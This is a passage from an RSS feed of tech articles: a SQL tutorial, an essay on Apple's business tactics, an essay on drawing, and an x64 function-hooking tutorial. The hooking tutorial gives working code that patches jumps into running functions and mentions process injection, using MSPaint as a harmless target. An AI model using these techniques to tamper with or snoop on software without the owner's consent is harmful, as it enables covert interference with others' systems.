When it comes to carving down the height of our data block - the quantity of rows in the result set - we have more than one tool at our disposal.  
</p>

<p>
The most important, and commonly used of these, is the WHERE clause.  
You can think of the WHERE clause as the multi-tool (e.g. Swiss Army knife) of carving instruments.  
You can use it to lop off huge chunks, or chip off little bits, from your block of data.  
</p>

<br>
<pre><code>SELECT * FROM flashcards WHERE author = 'Mike';
SELECT * FROM flashcards WHERE create_date &gt; '2020-09-01';
SELECT * FROM flashcards WHERE question like '%awesome%';</code>
</pre>


<p>
You can use it to make multiple cuts, all at the same time.  
</p>

<br>
<pre><code>SELECT * FROM flashcards
WHERE author = 'Mike'
    AND create_date &gt; '2020-09-01'
    AND question like '%awesome%';</code>
</pre>


<p>
The LIMIT clause is another commonly used row carving tool.  
It's not a very sophisticated tool, at least by itself.  
You can think of it as the kiddie scissors of carving tools.  
Here, we will retrieve only the first 25 rows from our flashcards table:  
</p>

<br>
<pre><code>SELECT * FROM flashcards
LIMIT 25;</code>
</pre>


<p>
The LIMIT clause is often used in combination with the OFFSET clause in order to take a slice from somewhere in the middle.  </p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.srsoterica.com/articles/database/sql_as_sculpture">https://www.srsoterica.com/articles/database/sql_as_sculpture</a></em></p>]]>
            </description>
            <link>https://www.srsoterica.com/articles/database/sql_as_sculpture</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083167</guid>
            <pubDate>Fri, 13 Nov 2020 15:23:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Six business lessons you should learn from Apple’s latest products]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25083089">thread link</a>) | @DevhouseSpindle
<br/>
November 13, 2020 | https://wearespindle.com/articles/6-business-lessons-you-should-learn-from-apples-latest-products/ | <a href="https://web.archive.org/web/*/https://wearespindle.com/articles/6-business-lessons-you-should-learn-from-apples-latest-products/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<div>
    <div>
                    
                <div>
            <div>
                <p><a href="https://wearespindle.com/articles">«	 Back to all articles</a></p>
                
                
                <p><img src="https://wearespindle.com/wp-content/uploads/2018/02/Mark-V-150x150.jpg" alt="">
                                    </p>
				                <p>Written by <strong>Mark Vletter</strong> on 13th November 2020                    </p><ul>
                                                                                <li>Apple</li>
                                                            <li>marketing</li>
                                                            <li>product development</li>
                                                                        </ul>
                

                
                <p>If you are a tech enthusiast, Apple has been very hard to miss. As a nerd, I look at Apple from a gadget perspective. But as a founder I look at them differently. Here are 6 lessons Apple can teach you about product development and marketing including one lesson you should not copy.</p>
<h2>1. Good architecture wins</h2>
<p>At its core, a MacBook as well as any other Apple computer, runs macOS. MacOS is based on the operating system Unix and a core called Darwin. Apple has made a very strong software architecture based on these components. That architecture is so strong that Apple is now able to switch out the very brain of the computer; both the processor/CPU and the language it speaks. The reason is that Apple has been making its own CPU for years for the iPhone. That CPU is so mature now that they feel a derivative of it will be better for the Macbooks as well. It also makes them independent of Intel. That is a big plus. Computer updates are usually directly linked to CPU updates and Apple is now completely free to run their own update cycles.</p>
<p>Apple once started with their own PowerPC CPU but 15 years ago they moved to Intel CPU’s because at that time, Intel was faster. Now, at the end of 2020, they introduced Apple Silicon, which will replace Intel because Intel can’t keep up anymore.</p>
<p>Swapping out a brain and the language it uses is a massive accomplishment. Apple did this twice; first from PowerPC to Intel and now from Intel to the Apple Silicon M1! The only reason they were able to do it was because of the good architecture their computers are built on.</p>
<p>Good architecture wins.</p>
<h2>2. Let your products share and borrow from each other</h2>
<p>The Darwin core we just talked about? It’s not just the core for MacOS. It’s also the core for iOS (iPhones), WatchOS (Apple Watches), tvOS (for Apple TV), and iPadOS (for the iPad).</p>
<p>The foundation of everything Apple builds is shared between these products. And it goes even further. A derivative of the brain used in an iPhone is now also used in that new MacBook Apple just announced. This means the chips Apple develops are built on a similar platform as well.</p>
<p>With the same hardware and the same software, you can also use the same code. That’s why it is so easy to develop for the iOS family of devices; there are so many similarities. That’s also the reason iPad/iPhone apps will work on your new MacBook, making apps device-agnostic.</p>
<p>This is a major plus for any developer, both internally and externally, writing programs or building hardware for the Apple family. If you share hardware and software in multiple products, you can move way faster.</p>
<h2>3. Be incomparable</h2>
<p>The announcement event unveiling the new Apple processors was a bit of a bummer for the hardcore nerd. Where chipmaker AMD will compare itself to Intel – which gives you a reference on how good they are – Apple does nothing like that.</p>
<p>Apple uses phrases like “Up to twice as fast as the latest notebook chips” or “Faster than 98% of PCs on the market” or “World’s fastest CPU performance per watt.”</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1024x576.png" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1024x576.png 1024w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-300x169.png 300w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-768x432.png 768w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1536x864.png 1536w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-2048x1152.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>The nerd in me would like to know which latest laptop PC chip they are comparing the M1 to</em></p>

<p>If you are not clear about how you are measuring something, it’s an empty statement. But it’s only empty for me as a nerd. It’s not empty for their target audience and their market! Apple understands that their target consumer simply does not care about these detailed technical benchmarks.</p>
<p>The Apple customer hears: “Ha, you see, my brand is better than your Windows machine, I made the right choice”.</p>
<p>The Windows user hears: “Damn, Apple made something way faster than my Windows machine, I should be switching.”</p>
<p>The intro song <em>Tones and I – Fly Away</em> used for the “<a href="https://www.apple.com/apple-events/november-2020/">One More Thing</a>” event where the new MacBooks and processor were announced, even starts with the lyrics “I don’t want to be like them”.</p>
<p>It’s not about specs for Apple, it’s about bringing a sense of awe to their target audience, which makes them incomparable.</p>
<h2>4. Market everything by giving it a name</h2>
<p>The incomparable part is pure marketing, and it’s where Apple shines. They simply brand everything.</p>
<p>An Apple watch does not have a button; it has a <em>Digital Crown</em>.</p>
<p>Apple does not make processors, it makes <em>Apple Silicon</em>.</p>
<p>The new chip does not have a core for machine learning, it has a <em>Neural Engine</em>.</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1024x683.jpg" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1024x683.jpg 1024w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-300x200.jpg 300w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-768x512.jpg 768w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1536x1024.jpg 1536w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-2048x1365.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>An Apple watch does not have a button, it has a digital crown</em></p>

<p>It all feels special. It all feels unique. And it makes you feel like you need the product or the upgrade.</p>
<p>So, if you build a cool new product feature, put some effort in your feature branding as well. And, as we can learn from Apple, this starts with a cool name for each feature.</p>
<h2>5. Optimize for total chain control</h2>
<p>Apple can claim the new processor is x-times as fast because they don’t just control the hardware, they control the software as well. And that software is completely optimized for the hardware. The fact that 3rd party software still needs to be optimized for the hardware gives Apple an edge over 3rd parties as well. If Safari is faster and uses less battery than Chrome there is an extra reason to use Safari. If Final Cut Pro runs better than Adobe Premiere a user will choose Final Cut Pro.</p>
<p>This goes even further in the Apple Store used on iPhone and iPad devices. Apple does not just control the store. They control the hardware, the software, the store, and the software distribution channels. They even control their proprietary connector and the <a href="https://en.wikipedia.org/wiki/MFi_Program">devices that are allowed to use it</a>. They also control the <a href="https://www.ifixit.com/News/43008/apple-emails-reveal-internal-debate-on-right-to-repair">repair channels</a>.</p>
<p>You could even say they <a href="https://www.timetoplayfair.com/">abuse</a> <a href="https://www.theverge.com/2020/8/13/21366259/epic-fortnite-vbucks-mega-drop-discount-iphone-android">this</a> <a href="https://www.theguardian.com/environment/2017/mar/06/nebraska-farmers-right-to-repair-john-deere-apple">power</a>.</p>
<p>However you look at it, it makes Apple mighty successful and independent.</p>
<h2>6. Don’t be afraid to make radical decisions (that hurt customers)</h2>
<p>This one is the toughest to swallow. Switching processors is a radical decision which benefits the customers in the long run. These decisions are brave and should be celebrated.</p>
<p>On the other hand, Apple often makes decisions that directly affect customers in a negative way.</p>
<p>The new M1 chips have everything – even memory – built into the chip. That makes the chip very fast and efficient, but you won’t be able to upgrade memory anymore.</p>
<p>Apple can bring out new devices with just two small USB-C ports (their new laptops). Which means you have to buy dongles (Apple multiport $69,-). Apple can ditch the so-widely-used 3,5mm jack port on the iPhone. Which means you have to buy Apple headphones, preferably the expensive bluetooth ones (Apple AirPods Pro $249). Apple can keep a lightning port on the iPhone, whereas the entire smartphone world is going USB-C, which means you have to replace the cable and it creates a vendor lock for accessories. And yes, you have to buy those cables again and again because they are flimsy and break all the time (USB-C to Lightning Cable (1 m) $19).</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-1024x437.jpg" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-1024x437.jpg 1024w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-300x128.jpg 300w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-768x327.jpg 768w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable.jpg 1400w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>The environment would really benefit from cables that don’t break within 6 months</em></p>

<p>They can even ditch a charger – where the new cables they supply with your phone are not even compatible with the existing iPhone chargers – so people have to buy a power brick (Apple 20w brick $19).</p>
<p>The reasoning here is very simple. No, it’s not innovation and it’s not the <a href="https://www.theverge.com/2020/10/16/21519466/apple-iphone-12-chargers-airpods-greenhouse-gas-emissions-e-waste">not the planet</a>. It is money. Apple is a shareholder-owned <a href="https://www.kevinrooke.com/post/apple-airpods-iphone-accessory-or-the-next-big-thing">money machine</a>. And this is the one thing I would ask you not to copy. Be there for your customers and the people you work with first, and let money be a by-product of doing the right stuff right.</p>
<h2>Changing the game for better or worse</h2>
<p>Apple’s product launches have become a fall tradition. Every year we wait for them, and wait to see not only what innovative products they are introducing, but also how they are changing the game. For tech enthusiasts and entrepreneurs alike, any big company has multiple examples of what-to-do and what-not-to-do. But Apple is in a league of its own. Whether you love the brand or think they represent everything that’s wrong with the world, Apple is a force to learn from.</p>

                


                

            </div>
        </div>
    </div>
</div>

    

</div></div>]]>
            </description>
            <link>https://wearespindle.com/articles/6-business-lessons-you-should-learn-from-apples-latest-products/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083089</guid>
            <pubDate>Fri, 13 Nov 2020 15:15:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[X64 Function Hooking by Example]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25083037">thread link</a>) | @ingve
<br/>
November 13, 2020 | http://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html | <a href="https://web.archive.org/web/*/http://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
  

<p>I’ve spent some time recently figuring out how function hooking works. There are tons of great resources available about it, but I’ve noticed that a lot of them are really light on providing example code, and the ones that do provide code tend to link to fully mature hooking frameworks. Usually the linked projects are really impressive, but they aren’t the easiest places to learn the basics from.</p>

<p>Now that I know enough to be dangerous, it seemed like fun to rectify this lack of sample code by building some hooking code from the ground up and walking through how to use that code to hook a running program. My past two blog posts were about making Notepad do weird stuff, so for the sake of variety, this post is going to pick on MSPaint instead.</p>

<p>I’m going to explain how to build 4 example programs. Two of them will show off fundamental hooking concepts by hooking functions in the example code itself. The other two will use those same concepts to hook MSPaint and make it disable the “Edit With Paint3D” button in a running MSPaint instance and force it to always draw with my favourite color (orange).</p>

<div>
<p><img src="http://kylehalladay.com/images/post_images/2020-11-13/orangepaint.gif"></p></div>

<p>If you’re only interested in sample code, I’ve published a github repo called <a href="https://github.com/khalladay/hooking-by-example">Hooking-by-Example</a> which has 14 increasingly complex example programs that demonstrate how function hooking works (or at least, the bits of it that I’ve figured out). Everything that I talk about here (and more) is also demonstrated by the programs in that repo.</p>

<h2 id="wtf-is-function-hooking">WTF is Function Hooking?</h2>
<p>Function Hooking is a programming technique that lets you to intercept and redirect function calls in a running application, allowing you to change that program’s runtime behaviour in ways that may not have been intended when the program was initially compiled. It’s a little bit like when a dog gets into a car thinking they’re going to the park and ends up at the vet instead. The dog called goToPark(), but instead unexpectedly ended up inside goToVet() instead. This example isn’t great.</p>

<p>The real fun of function hooking is that you can use it to change the behaviour of programs that you don’t have the source code to, or otherwise can’t recompile. Combined with process injection (which I explained a bit <a href="http://kylehalladay.com/blog/2020/05/20/Hooking-Input-Snake-In-Notepad.html">in my last post</a>), you can use function hooks to add entirely new behaviour to any program that you can run on your pc. For example, <a href="https://reshade.me/">ReShade</a> uses function hooking to add new postprocessing effects to games, and <a href="https://renderdoc.org/">RenderDoc</a> uses a form of hooking (although not the kind covered here) to allow you to debug graphics code in running applications.</p>

<p>More examples of things you might want to do with function hooking include:</p>

<ul>
  <li>Logging or replacing function arguments</li>
  <li>Disabling functions</li>
  <li>Measuing the execution time of a function</li>
  <li>Monitoring or replacing data before it gets sent over a network</li>
</ul>

<p>The only limits are your imagination and ability to read assembly!</p>

<h2 id="how-does-it-work">How Does It Work?</h2>
<p>Let’s say we have a function that adds two Gdiplus::ARGB values together, and we want to use a hook to bypass the addition logic and always return red. The ARGB type is a DWORD that uses a byte for Alpha, Red, Green, and Blue, respectively. Adding two of them together might look like this:</p>

<figure><pre><code data-lang="c++"><span>Gdiplus</span><span>::</span><span>ARGB</span> <span>AddColors</span><span>(</span><span>Gdiplus</span><span>::</span><span>ARGB</span> <span>left</span><span>,</span> <span>Gdiplus</span><span>::</span><span>ARGB</span> <span>right</span><span>)</span>
<span>{</span>
  <span>uint32_t</span> <span>a</span> <span>=</span> <span>min</span><span>(</span><span>0xFF000000</span><span>,</span> <span>(</span><span>left</span> <span>&amp;</span> <span>0xFF000000</span><span>)</span> <span>+</span> <span>(</span><span>right</span> <span>&amp;</span> <span>0xFF000000</span><span>));</span>
  <span>uint32_t</span> <span>r</span> <span>=</span> <span>min</span><span>(</span><span>0x00FF0000</span><span>,</span> <span>(</span><span>left</span> <span>&amp;</span> <span>0x00FF0000</span><span>)</span> <span>+</span> <span>(</span><span>right</span> <span>&amp;</span> <span>0x00FF0000</span><span>));</span>
  <span>uint32_t</span> <span>g</span> <span>=</span> <span>min</span><span>(</span><span>0x0000FF00</span><span>,</span> <span>(</span><span>left</span> <span>&amp;</span> <span>0x0000FF00</span><span>)</span> <span>+</span> <span>(</span><span>right</span> <span>&amp;</span> <span>0x0000FF00</span><span>));</span>
  <span>uint32_t</span> <span>b</span> <span>=</span> <span>min</span><span>(</span><span>0x000000FF</span><span>,</span> <span>(</span><span>left</span> <span>&amp;</span> <span>0x000000FF</span><span>)</span> <span>+</span> <span>(</span><span>right</span> <span>&amp;</span> <span>0x000000FF</span><span>));</span>

  <span>return</span> <span>a</span> <span>|</span> <span>r</span> <span>|</span> <span>g</span> <span>|</span> <span>b</span><span>;</span>
<span>}</span></code></pre></figure>

<p>The function that we want to replace it with (which I’ll call that “payload” function), looks like this:</p>

<figure><pre><code data-lang="c++"><span>Gdiplus</span><span>::</span><span>ARGB</span> <span>ReturnRed</span><span>(</span><span>Gdiplus</span><span>::</span><span>ARGB</span> <span>left</span><span>,</span> <span>Gdiplus</span><span>::</span><span>ARGB</span> <span>right</span><span>)</span>
<span>{</span>
    <span>return</span> <span>0xffff0000</span><span>;</span>  
<span>}</span></code></pre></figure>

<p>If this was in your own code, you’d add a “return ReturnRed(left, right)” call to the beginning of AddColors(), recompile and call it a day, but what if you couldn’t recompile it? For example, what if it’s part of a closed source third party library, or the program that calls AddColors() is already running?</p>

<p>Rather than recompiling, we can use hooking to modify its instruction bytes instead, and replace the first instruction in AddColors() with a jmp to the beginning of the ReturnRed() function. This works even if the function we want to hook comes from a system dll, since DLL code segments are copy-on-write, so there’s no chance of a hook interfering with other processes.</p>

<p>Imagine that the first instruction in ReturnRed() is located 1024 bytes after AddColors() in memory. In assembly, replacing AddColors’ instructions with a jump will look like this:</p>

<div>
<p><img src="http://kylehalladay.com/images/post_images/2020-11-13/basic_hook_thin.PNG"></p></div>

<p>The jump instruction used here is a relative jump with a 32 bit operand. The opcode is E9, and that’s followed by a 4 byte value that represents how many bytes to jump.</p>

<p>Notice that after the jmp instruction, we’re left with garbage. This is because the process of overwriting the first 5 bytes of AddColors() left a partial instruction in its wake. The first byte of the second instruction was overwritten, but the rest of the bytes are still there, and who knows what instructions those map to. That leaves the rest of the function in an unknown (and likely invalid) state. This doesn’t matter for the example, because the program is going to jump to ReturnRed() before it ever gets to the garbage we just created, but it’s important to keep in mind.</p>

<p>We’ll write some hooks that preserve the hooked function’s original logic later in this post, so don’t worry about that too much right now. For our first example, we’ll build a program that destructively hooks a function, exactly like what’s shown in the diagram above (with some extra sauce to handle 64 bit code).</p>

<h2 id="example-1-our-first-function-hook">Example 1: Our First Function Hook</h2>
<p>Let’s roll with the example code already provided and write a program that actually redirects program flow from AddColors() to ReturnRed(). The game plan here is to end up with a main() function that looks like this:</p>

<figure><pre><code data-lang="c++"><span>//both functions inside the same program as main()</span>
<span>Gdiplus</span><span>::</span><span>ARGB</span> <span>AddColors</span><span>(</span><span>Gdiplus</span><span>::</span><span>ARGB</span> <span>left</span><span>,</span> <span>Gdiplus</span><span>::</span><span>ARGB</span> <span>right</span><span>);</span>
<span>Gdiplus</span><span>::</span><span>ARGB</span> <span>ReturnRed</span><span>(</span><span>Gdiplus</span><span>::</span><span>ARGB</span> <span>left</span><span>,</span> <span>Gdiplus</span><span>::</span><span>ARGB</span> <span>right</span><span>);</span>

<span>int</span> <span>main</span><span>()</span>
<span>{</span>
  <span>//install a hook in AddColors, going to ReturnRed</span>
  <span>InstallHook</span><span>(</span><span>AddColors</span><span>,</span> <span>ReturnRed</span><span>);</span>

  <span>Gdiplus</span><span>::</span><span>ARGB</span> <span>col</span> <span>=</span>  <span>AddColors</span><span>(</span><span>0x00000000</span><span>,</span> <span>0x000000FF</span><span>);</span>
  <span>printf</span><span>(</span><span>"%x</span><span>\n</span><span>"</span><span>,</span> <span>col</span><span>);</span> <span>//will always be 0xFFFF0000</span>
  <span>return</span> <span>0</span><span>;</span>
<span>}</span></code></pre></figure>

<p>In a 32 bit program, the logic for InstallHook() can be implemented pretty much exactly how the diagram above suggests it would be:</p>

<figure><pre><code data-lang="c++"><span>void</span> <span>InstallHook</span><span>(</span><span>void</span><span>*</span> <span>func2hook</span><span>,</span> <span>void</span><span>*</span> <span>payloadFunction</span><span>)</span>
<span>{</span>
  <span>DWORD</span> <span>oldProtect</span><span>;</span>
  <span>VirtualProtect</span><span>(</span><span>AddColors</span><span>,</span> <span>1024</span><span>,</span> <span>PAGE_EXECUTE_READWRITE</span><span>,</span> <span>&amp;</span><span>oldProtect</span><span>);</span>
    
  <span>//32 bit relative jump opcode is E9, takes 1 32 bit operand for jump offset</span>
  <span>uint8_t</span> <span>jmpInstruction</span><span>[</span><span>5</span><span>]</span> <span>=</span> <span>{</span> <span>0xE9</span><span>,</span> <span>0x0</span><span>,</span> <span>0x0</span><span>,</span> <span>0x0</span><span>,</span> <span>0x0</span> <span>};</span>
    
  <span>//to fill out the last 4 bytes of jmpInstruction, we need the offset between </span>
  <span>//the payload function and the instruction immediately AFTER the jmp instruction</span>
  <span>const</span> <span>uint32_t</span> <span>relAddr</span> <span>=</span> <span>(</span><span>uint32_t</span><span>)</span><span>payloadFunction</span> <span>-</span> <span>((</span><span>uint32_t</span><span>)</span><span>func2hook</span> <span>+</span> <span>sizeof</span><span>(</span><span>jmpInstruction</span><span>));</span>
  <span>memcpy</span><span>(</span><span>jmpInstruction</span> <span>+</span> <span>1</span><span>,</span> <span>&amp;</span><span>relAddr</span><span>,</span> <span>4</span><span>);</span>

  <span>//install the hook</span>
  <span>memcpy</span><span>(</span><span>func2hook</span><span>,</span> <span>jmpInstruction</span><span>,</span> <span>sizeof</span><span>(</span><span>jmpInstruction</span><span>));</span>
<span>}</span></code></pre></figure>

<p>Things are a bit trickier in 64 bit, because functions can be located so far away from each other in memory that a 32 bit jmp instruction can’t jump that far, meaning that the 5 byte jump written by InstallHook() might be unable to reach the payload function from the hooked function.</p>

<p>There’s no such thing as a 64 bit relative jmp instruction, so the next best option is to jmp to an address stored in a register, like the assembly shown below. Note that this snippet uses the r10 register because it’s one of the few volatile registers that isn’t used for passing function arguments in the Windows x64 calling convention (<a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019">msdn link</a>)</p>

<figure><pre><code data-lang="asm">49 BA 00 00 00 00 00 00 04 00   mov        r10,400h  
41 FF E2                        jmp        r10  </code></pre></figure>

<p>If we throw this in the beginning of hooked functions instead of the 5 byte jump from before, we’d limit the number of functions that we could hook to those with 13 or more bytes. That’s a singificantly bigger limitation than our 32 bit code, so we’re instead going to write the bytes for this absolute jump somewhere in memory that’s close to the function we’re hooking. Then we’ll have the 5 byte jump we install in that function jump to this absolute jump, instead of straight to the payload function. <a href="https://github.com/TsudaKageyu/minhook">Minhook</a> refers to this absolute jump as the “relay function,” and I’m going to use that terminology as well.</p>

<div>
<p><img src="http://kylehalladay.com/images/post_images/2020-11-13/64bit_basic_hook.PNG"></p></div>

<p>Writing code to do this little dance is similar to the InstallHook() function shown above, but with a few more steps. The trickiest part of the process is allocating memory for the relay function that’s close enough to the target function to be reachable by a 5 byte jump. I’ve implemented logic for this in a function called AllocatePageNearAddress(). This function is a bit long, so I’ve included it’s implementation in the (expandable) box below, and omitted it from the sample code snippet immediately after that.</p>

<div>
<details>
    <summary>AllocPageNearAddress() implementation (click to expand)</summary>

    <figure><pre><code data-lang="c++"><span>void</span><span>*</span> <span>AllocatePageNearAddress</span><span>(</span><span>void</span><span>*</span> <span>targetAddr</span><span>)</span>
<span>{</span>
  <span>SYSTEM_INFO</span> <span>sysInfo</span><span>;</span>
  <span>GetSystemInfo</span><span>(</span><span>&amp;</span><span>sysInfo</span><span>);</span>
  <span>const</span> <span>uint64_t</span> <span>PAGE_SIZE</span> <span>=</span> <span>sysInfo</span><span>.</span><span>dwPageSize</span><span>;</span>

  <span>uint64_t</span> <span>startAddr</span> <span>=</span> <span>(</span><span>uint64_t</span><span>(</span><span>targetAddr</span><span>)</span> <span>&amp;</span> <span>~</span><span>(</span><span>PAGE_SIZE</span> <span>-</span> <span>1</span><span>));</span> <span>//round down to nearest page boundary</span>
  <span>uint64_t</span> <span>minAddr</span> <span>=</span> <span>min</span><span>(</span><span>startAddr</span> <span>-</span> <span>0x7FFFFF00</span><span>,</span> <span>(</span><span>uint64_t</span><span>)</span><span>sysInfo</span><span>.</span><span>lpMinimumApplicationAddress</span><span>);</span>
  <span>uint64_t</span> <span>maxAddr</span> <span>=</span> <span>max</span><span>(</span><span>startAddr</span> <span>+</span> <span>0x7FFFFF00</span><span>,</span> <span>(</span><span>uint64_t</span><span>)</span><span>sysInfo</span><span>.</span><span>lpMaximumApplicationAddress</span><span>);</span>

  <span>uint64_t</span> <span>startPage</span> <span>=</span> <span>(</span><span>startAddr</span> <span>-</span> <span>(</span><span>startAddr</span> <span>%</span> <span>PAGE_SIZE</span><span>));</span>

  <span>uint64_t</span> <span>pageOffset</span> <span>=</span> <span>1</span><span>;</span>
  <span>while</span> <span>(</span><span>1</span><span>)</span>
  <span>{</span>
    <span>uint64_t</span> <span>byteOffset</span> <span>=</span> <span>pageOffset</span> <span>*</span> <span>PAGE_SIZE</span><span>;</span>
    <span>uint64_t</span> <span>highAddr</span> <span>=</span> <span>startPage</span> <span>+</span> <span>byteOffset</span><span>;</span>
		<span>uint64_t</span> <span>lowAddr</span> <span>=</span> <span>(</span><span>startPage</span> <span>&gt;</span> <span>byteOffset</span><span>)</span> <span>?</span> <span>startPage</span> <span>-</span> <span>byteOffset</span> <span>:</span> <span>0</span><span>;</span>

    <span>bool</span> <span>needsExit</span> <span>=</span> <span>highAddr</span> <span>&gt;</span> <span>maxAddr</span> <span>&amp;&amp;</span> <span>lowAddr</span> <span>&lt;</span> <span>minAddr</span><span>;</span>

    <span>if</span> <span>(</span><span>highAddr</span> <span>&lt;</span> <span>maxAddr</span><span>)</span>
    <span>{</span>
      <span>void</span><span>*</span> <span>outAddr</span> <span>=</span> <span>Virtua…</span></code></pre></figure></details></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html">http://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html</a></em></p>]]>
            </description>
            <link>http://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083037</guid>
            <pubDate>Fri, 13 Nov 2020 15:10:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Drawing, Even Badly, Is Worthwhile]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25083002">thread link</a>) | @user_235711
<br/>
November 13, 2020 | http://passionatereason.com/2020/11/why-drawing-even-badly-is-worthwhile/ | <a href="https://web.archive.org/web/*/http://passionatereason.com/2020/11/why-drawing-even-badly-is-worthwhile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<figure><img loading="lazy" width="640" height="507" src="https://i0.wp.com/passionatereason.com/wp-content/uploads/2020/11/sketch.jpg?resize=640%2C507" alt="" srcset="https://i0.wp.com/passionatereason.com/wp-content/uploads/2020/11/sketch.jpg?w=640 640w, https://i0.wp.com/passionatereason.com/wp-content/uploads/2020/11/sketch.jpg?resize=300%2C238 300w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1"></figure>



<p>Recently I told my brother I had been drawing a lot during the pandemic.</p>



<p>He said, “I envy you. I wish I could draw. I remember how much I enjoyed it as a kid. I’m too old now to really get good at it.”</p>



<p>I knew how he felt. I’ve spent much of my life talking myself out of fun activities by asking myself, “What’s the point in learning a new skill at this stage? To achieve the Ninja-like mastery I require, I would have needed to start as a three-year-old.’ Therefore, it’s not worth it to even begin.”</p>



<p>But my view has changed. I told my brother, “I’m not drawing to be an expert.&nbsp; I’m drawing because I enjoy it.”</p>



<p>I told him how I was working my way through a drawing book for beginners. This surprised him since I was an art major in college.</p>



<p>But I was never the best at drawing. I was always better at writing. However, there is no shame in starting anew.</p>



<p>I love how-to books for beginners. There is something liberating about an introduction that assumes you know nothing about a subject even if you do. Even though I’ve written four novels, I still enjoy books for children that cover the basics of storytelling.</p>



<p>Books for beginners call forth my childhood – a time that I felt free to experiment before my adult ego decided I had to do everything perfectly the first time.</p>



<p>That’s why I loved my drawing book <em>Learn to Draw in 28 Days </em>by Mark Kistler. It made me remember how I had drawn as a child, not with some practical purpose like making money, getting a good grade, or impressing anyone, but because I enjoyed the scratch of a pencil across a page and the power to create something new.</p>



<p>Moreover, drawing feels the way I think meditation ought to feel but never does. While making marks, I lose track of time. I feel clearer. Drawing has even relieved my migraine headaches.</p>



<p>At the same time, creating the illusion of three-dimensional space on a two-dimensional surface feels magical. I like exploring the way my eyes perceive my surroundings — the play of light and shadow that make objects look the way they do.</p>



<p>Drawing awakens my sense that life is fundamentally strange. It makes me aware of the dynamic role negative space plays in a visual composition. Negative space is the underdog of the visual world. Usually it gets overlooked, but without it a drawing couldn’t exist. It makes me ponder the necessity of nothing for there to be <em>something</em>.</p>



<p>I finished my beginning drawing book. Since then, I have also been working through a book for beginners on drawing comics. Though my skills are shaky, I love exploring the linear component of human expressions. &nbsp;Can you create an emotion on a page using only a few strokes of a pencil? Comic book artists do this all the time with astonishing ease.</p>



<p>The fun I have had with my messy beginnings makes me think that sometimes a thing is worth doing badly rather than not doing it at all. Whenever I slip into a frame of mind that says I must only draw to make money or become famous, I try to catch myself. <strong>&nbsp;</strong>This utilitarian attitude, with its accompanying fear of failure, can leech joy from any activity. The trick to enjoying art is to pretend you are a kid again and no one expects anything from you<strong>. </strong>Writing is the same way.&nbsp; I wish I had known this much earlier — and I wish my brother had, too.</p>
			</div></div>]]>
            </description>
            <link>http://passionatereason.com/2020/11/why-drawing-even-badly-is-worthwhile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083002</guid>
            <pubDate>Fri, 13 Nov 2020 15:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make Your Slack App Feel More Like Home]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25082798">thread link</a>) | @i-dont-remember
<br/>
November 13, 2020 | https://happybara.io/blog/slack-app-home-navigation/ | <a href="https://web.archive.org/web/*/https://happybara.io/blog/slack-app-home-navigation/">archive.org</a>
